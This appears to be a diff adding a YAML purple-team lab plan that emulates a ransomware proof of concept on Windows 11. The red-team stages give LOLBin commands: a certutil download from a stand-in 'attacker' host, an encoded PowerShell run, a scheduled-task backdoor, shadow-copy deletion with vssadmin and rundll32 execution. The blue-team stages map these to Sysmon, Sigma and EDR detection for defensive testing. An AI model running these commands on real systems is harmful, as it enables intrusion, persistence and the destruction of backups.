@@ -1,0 +1,88 @@
+---
+# Purple Team Lab Plan: NSFW-Ransomware Emulation Using LOLBins
+
+lab_name: "NSFW-Ransomware Simulation Lab"
+description: |
+  This lab simulates a realistic ransomware attack using the NSFW-Ransomware PoC. The goal is to evaluate detection capabilities against LOLBins and fileless execution on Windows 11 using Sigma rules, Sysmon, and MITRE ATT&CK.
+
+---
+
+lab_components:
+  - Windows 11 VM (Defender enabled, Sysmon installed)
+  - NSFW-Ransomware GitHub repo cloned
+  - Sysmon (SwiftOnSecurity config or custom detection rules)
+  - Sigma rules engine (e.g., Elastic SIEM, Splunk, or HELK)
+  - Atomic Red Team (for TTP mirroring)
+
+---
+
+red_team_ttp:
+  stage_1_initial_access:
+    - name: Certutil Payload Download
+      command: certutil -urlcache -split -f http://attacker/nsfw.exe nsfw.exe
+      mitre_id: T1105
+      lolbin: certutil.exe
+
+  stage_2_execution:
+    - name: PowerShell EncodedCommand Execution
+      command: powershell -EncodedCommand <base64 payload>
+      mitre_id: T1059.001
+      lolbin: powershell.exe
+
+  stage_3_persistence:
+    - name: Task Scheduler Backdoor
+      command: schtasks /create /tn backdoor /tr "powershell.exe ..." /sc minute /mo 5
+      mitre_id: T1053.005
+      lolbin: schtasks.exe
+
+  stage_4_defense_evasion:
+    - name: VSS Delete
+      command: vssadmin delete shadows /all /quiet
+      mitre_id: T1490
+      lolbin: vssadmin.exe
+
+  stage_5_execution:
+    - name: DLL Side-loading Execution
+      command: rundll32.exe nsfw.dll,Start
+      mitre_id: T1218.011
+      lolbin: rundll32.exe
+
+---
+
+blue_team_detection:
+  sysmon_config:
+    - EventID 1: Process Creation
+    - EventID 3: Network Connection
+    - EventID 11: File Creation
+    - EventID 13: Registry Modifications
+
+  sigma_rules:
+    - Mshta executing remote script
+    - PowerShell with Base64 payload
+    - Certutil downloading binary
+    - Scheduled tasks created by unknown binary
+    - Vssadmin or WMIC deleting shadow copies
+
+  edr_watchpoints:
+    - Unusual LOLBin command-line patterns
+    - Parent-child process chains (e.g., explorer → mshta → powershell)
+    - Unexpected network access from built-in tools
+
+---
+
+optional_tools:
+  - Caldera (MITRE ATT&CK automation framework)
+  - Velociraptor (live endpoint analysis)
+  - SysmonView (for log visualization)
+  - Loki (YARA + Sigma scanner)
+
+---
+
+execution_notes: |
+  - Always test in a sandbox/lab.
+  - Log each event and compare against Sigma rule triggers.
+  - Simulate user interaction only if needed.
+  - Observe for Defender or EDR alerts during each phase.
+  - Evaluate gaps in detection post-run.
+
+# END
